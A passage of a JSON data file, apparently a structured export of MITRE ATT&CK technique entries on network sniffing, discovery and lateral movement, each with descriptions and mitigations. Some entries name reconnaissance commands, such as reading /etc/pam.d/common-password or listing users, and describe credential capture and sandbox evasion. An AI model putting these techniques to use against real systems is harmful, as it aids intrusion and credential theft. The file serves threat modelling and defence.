          "content": "Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary."
        }
      ],
      [
        {
          "type": "text",
          "content": "Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities."
        }
      ],
      [
        {
          "type": "text",
          "content": "In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to. Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic. The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic."
        }
      ],
      [
        {
          "type": "text",
          "content": "On network devices, adversaries may perform network captures using Network Device CLI commands such as "
        },
        { "type": "code", "content": "monitor capture" },
        { "type": "text", "content": "." }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS."
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Use multi-factor authentication wherever possible."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Deny direct access of broadcasts and multicast sniffing, and prevent attacks such as LLMNR/NBT-NS Poisoning and SMB Relay"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "In cloud environments, ensure that users are not granted permissions to create or modify traffic mirrors unless this is explicitly required."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1201",
    "name": "Password Policy Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts)."
        }
      ],
      [
        {
          "type": "text",
          "content": "Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as "
        },
        { "type": "code", "content": "net accounts (/domain)" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "Get-ADDefaultDomainPasswordPolicy" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "chage -l " },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "cat /etc/pam.d/common-password" },
        { "type": "text", "content": ", and " },
        { "type": "code", "content": "pwpolicy getaccountpolicies" },
        {
          "type": "text",
          "content": "  . Adversaries may also leverage a Network Device CLI on network devices to discover password policy information (e.g. "
        },
        { "type": "code", "content": "show aaa" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "show aaa common-criteria policy all" },
        { "type": "text", "content": ")." }
      ],
      [
        {
          "type": "text",
          "content": "Password policies can be discovered in cloud environments using available APIs such as "
        },
        { "type": "code", "content": "GetAccountPasswordPolicy" },
        { "type": "text", "content": " in AWS ." }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory ("
            },
            { "type": "code", "content": "C:\\Windows\\System32\\" },
            {
              "type": "text",
              "content": " by default) of a domain controller and/or local computer with a corresponding entry in "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages"
            },
            { "type": "text", "content": ". " }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1120",
    "name": "Peripheral Device Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1069",
    "name": "Permission Groups Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [
      { "id": "T1069.001", "name": "Local Groups" },
      { "id": "T1069.002", "name": "Domain Groups" },
      { "id": "T1069.003", "name": "Cloud Groups" }
    ],
    "version": "2.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1057",
    "name": "Process Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
        }
      ],
      [
        {
          "type": "text",
          "content": "In Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or "
        },
        { "type": "code", "content": "Get-Process" },
        {
          "type": "text",
          "content": " via PowerShell. Information about processes can also be extracted from the output of Native API calls such as "
        },
        { "type": "code", "content": "CreateToolhelp32Snapshot" },
        {
          "type": "text",
          "content": ". In Mac and Linux, this is accomplished with the "
        },
        { "type": "code", "content": "ps" },
        {
          "type": "text",
          "content": " command. Adversaries may also opt to enumerate processes via /proc."
        }
      ],
      [
        {
          "type": "text",
          "content": "On network devices, Network Device CLI commands such as "
        },
        { "type": "code", "content": "show processes" },
        {
          "type": "text",
          "content": " can be used to display current running processes."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1012",
    "name": "Query Registry",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software."
        }
      ],
      [
        {
          "type": "text",
          "content": "The Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1018",
    "name": "Remote System Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "3.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or "
        },
        { "type": "code", "content": "net view" },
        { "type": "text", "content": " using Net." }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also analyze data from local host files (ex: "
        },
        {
          "type": "code",
          "content": "C:\\Windows\\System32\\Drivers\\etc\\hosts"
        },
        { "type": "text", "content": " or " },
        { "type": "code", "content": "/etc/hosts" },
        {
          "type": "text",
          "content": ") or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. "
        },
        { "type": "code", "content": "show cdp neighbors" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "show arp" },
        { "type": "text", "content": "). " }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1518",
    "name": "Software Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [{ "id": "T1518.001", "name": "Security Software Discovery" }],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1082",
    "name": "System Information Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "2.5",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
        }
      ],
      [
        {
          "type": "text",
          "content": "Tools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the "
        },
        { "type": "code", "content": "systemsetup" },
        {
          "type": "text",
          "content": " configuration tool on macOS. As an example, adversaries with user-level access can execute the "
        },
        { "type": "code", "content": "df -aH" },
        {
          "type": "text",
          "content": " command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. "
        },
        { "type": "code", "content": "show version" },
        {
          "type": "text",
          "content": "). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment."
        }
      ],
      [
        {
          "type": "text",
          "content": "Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1614",
    "name": "System Location Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [{ "id": "T1614.001", "name": "System Language Discovery" }],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from System Location Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings. Windows API functions such as "
        },
        { "type": "code", "content": "GetLocaleInfoW" },
        {
          "type": "text",
          "content": " can also be used to determine the locale of the host. In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1016",
    "name": "System Network Configuration Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [
      { "id": "T1016.001", "name": "Internet Connection Discovery" },
      { "id": "T1016.002", "name": "Wi-Fi Discovery" }
    ],
    "version": "1.6",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. "
        },
        { "type": "code", "content": "show ip route" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "show ip interface" },
        { "type": "text", "content": ")." }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. "
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1049",
    "name": "System Network Connections Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "2.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. "
        }
      ],
      [
        {
          "type": "text",
          "content": "An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services."
        }
      ],
      [
        {
          "type": "text",
          "content": "Utilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and "
        },
        { "type": "code", "content": "lsof" },
        {
          "type": "text",
          "content": " can be used to list current connections. "
        },
        { "type": "code", "content": "who -a" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "w" },
        {
          "type": "text",
          "content": " can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. "
        },
        { "type": "code", "content": "show ip sockets" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "show tcp brief" },
        { "type": "text", "content": ")." }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1033",
    "name": "System Owner/User Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
        }
      ],
      [
        {
          "type": "text",
          "content": "Various utilities and commands may acquire this information, including "
        },
        { "type": "code", "content": "whoami" },
        {
          "type": "text",
          "content": ". In macOS and Linux, the currently logged in user can be identified with "
        },
        { "type": "code", "content": "w" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "who" },
        { "type": "text", "content": ". On macOS the " },
        { "type": "code", "content": "dscl . list /Users | grep -v '_'" },
        {
          "type": "text",
          "content": " command can also be used to enumerate user accounts. Environment variables, such as "
        },
        { "type": "code", "content": "%USERNAME%" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "$USER" },
        {
          "type": "text",
          "content": ", may also be used to access this information."
        }
      ],
      [
        {
          "type": "text",
          "content": "On network devices, Network Device CLI commands such as "
        },
        { "type": "code", "content": "show users" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "show ssh" },
        {
          "type": "text",
          "content": " can be used to display users currently logged into the device."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1007",
    "name": "System Service Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as "
        },
        { "type": "code", "content": "sc query" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "tasklist /svc" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "systemctl --type=service" },
        { "type": "text", "content": ", and " },
        { "type": "code", "content": "net start" },
        { "type": "text", "content": "." }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1124",
    "name": "System Time Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. "
        }
      ],
      [
        {
          "type": "text",
          "content": "System time information may be gathered in a number of ways, such as with Net on Windows by performing "
        },
        { "type": "code", "content": "net time \\hostname" },
        {
          "type": "text",
          "content": " to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using "
        },
        { "type": "code", "content": "w32tm /tz" },
        { "type": "text", "content": "." }
      ],
      [
        {
          "type": "text",
          "content": "On network devices, Network Device CLI commands such as "
        },
        { "type": "code", "content": "show clock detail" },
        {
          "type": "text",
          "content": " can be used to see the current time configuration."
        }
      ],
      [
        {
          "type": "text",
          "content": "This information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job, or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1497",
    "name": "Virtualization/Sandbox Evasion",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0007", "name": "Discovery" }
    ],
    "subs": [
      { "id": "T1497.001", "name": "System Checks" },
      { "id": "T1497.002", "name": "User Activity Based Checks" },
      { "id": "T1497.003", "name": "Time Based Evasion" }
    ],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1210",
    "name": "Exploitation of Remote Services",
    "tactics": [{ "id": "TA0008", "name": "Lateral Movement" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system."
        }
      ],
      [
        {
          "type": "text",
          "content": "An adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Discovery or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources."
        }
      ],
      [
        {
          "type": "text",
          "content": "There are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services."
        }
      ],
      [
        {
          "type": "text",
          "content": "Depending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1048",
        "name": "Application Isolation and Sandboxing",
        "description": [
          [
            {
              "type": "text",
              "content": "Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist. "
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Minimize available services to only those that are necessary."
            }
          ]
        ]
      },
      {
        "id": "M1050",
        "name": "Exploit Protection",
        "description": [
          [
            {
              "type": "text",
              "content": "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior.  Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring.  Many of these protections depend on the architecture and target application binary for compatibility and may not work for all software or services targeted."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Segment networks and systems appropriately to reduce access to critical systems and services to controlled methods."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Minimize permissions and access for service accounts to limit impact of exploitation."
            }
          ]
        ]
      },
      {
        "id": "M1019",
        "name": "Threat Intelligence Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Update software regularly by employing patch management for internal enterprise endpoints and servers."
            }
          ]
        ]
      },
      {
        "id": "M1016",
        "name": "Vulnerability Scanning",
        "description": [
          [
            {
              "type": "text",
              "content": "Regularly scan the internal network for available services to identify new and potentially vulnerable services."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1534",
    "name": "Internal Spearphishing",
    "tactics": [{ "id": "TA0008", "name": "Lateral Movement" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged campaign where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may leverage Spearphishing Attachment or Spearphishing Link as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through Input Capture on sites that mimic email login interfaces."
        }
      ],
      [
        {
          "type": "text",
          "content": "There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process. The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the campaign and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1570",
    "name": "Lateral Tool Transfer",
    "tactics": [{ "id": "TA0008", "name": "Lateral Movement" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol."
        }
      ],
      [
        {
          "type": "text",
          "content": "Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp. In some cases, adversaries may be able to leverage Web Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider using the host firewall to restrict file sharing communications such as SMB. "
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1563",
    "name": "Remote Service Session Hijacking",
    "tactics": [{ "id": "TA0008", "name": "Lateral Movement" }],
    "subs": [
      { "id": "T1563.001", "name": "SSH Hijacking" },
      { "id": "T1563.002", "name": "RDP Hijacking" }
    ],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may commandeer these sessions to carry out actions on remote systems. Remote Service Session Hijacking differs from use of Remote Services because it hijacks an existing session rather than creating a new session using Valid Accounts."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable the remote service (ex: SSH, RDP, etc.) if it is unnecessary."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Enable firewall rules to block unnecessary traffic between network security zones within a network."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Do not allow remote access to services as a privileged account unless necessary."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit remote user permissions if remote access is necessary."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1021",
    "name": "Remote Services",
    "tactics": [{ "id": "TA0008", "name": "Lateral Movement" }],
    "subs": [
      { "id": "T1021.001", "name": "Remote Desktop Protocol" },
      { "id": "T1021.002", "name": "SMB/Windows Admin Shares" },
      { "id": "T1021.003", "name": "Distributed Component Object Model" },
      { "id": "T1021.004", "name": "SSH" },
      { "id": "T1021.005", "name": "VNC" },
      { "id": "T1021.006", "name": "Windows Remote Management" },
      { "id": "T1021.007", "name": "Cloud Services" },
      { "id": "T1021.008", "name": "Direct Cloud VM Connections" }
    ],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use Valid Accounts to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user."
        }
      ],
      [
        {
          "type": "text",
          "content": "In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP). They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Legitimate applications (such as Software Deployment Tools and other administrative programs) may utilize Remote Services to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer. Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "If remote services, such as the ability to make direct connections to cloud virtual machines, are not required, disable these connection types where feasible."
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Use multi-factor authentication on remote service logons where possible."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
